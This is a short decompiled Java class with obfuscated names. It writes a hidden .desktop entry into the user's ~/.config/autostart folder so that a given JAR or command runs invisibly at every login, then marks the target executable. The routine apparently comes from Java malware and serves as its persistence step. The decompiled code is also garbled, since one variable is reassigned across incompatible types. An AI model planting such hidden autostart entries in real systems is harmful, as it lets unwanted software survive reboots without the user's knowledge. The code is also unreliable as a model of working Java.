/*
 * Decompiled with CFR 0_124.
 */
package b;

import b.a;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.io.Writer;

public final class d
extends a {
    public d(String string, String string2, boolean bl) {
        super(string, string2, bl);
    }

    private static File b() {
        String string = System.getProperty("user.home");
        return new File(String.valueOf(string) + "/.config/autostart/");
    }

    @Override
    public final void a() {
        if (!d.b().exists()) {
            d.b().mkdirs();
        }
        String[] arrstring = new File(d.b(), String.valueOf(this.b) + ".desktop");
        arrstring = new PrintWriter(new FileWriter((File)arrstring));
        arrstring.println("[Desktop Entry]");
        arrstring.println("Type=Application");
        arrstring.println("Name=" + this.b);
        if (this.a) {
            arrstring.println("Exec=java -jar '" + this.c + "'");
        } else {
            arrstring.println("Exec=" + this.c);
        }
        arrstring.println("Terminal=false");
        arrstring.println("NoDisplay=true");
        arrstring.close();
        arrstring = new String[]{"chmod", "+x", this.c};
        Runtime.getRuntime().exec(arrstring);
    }
}
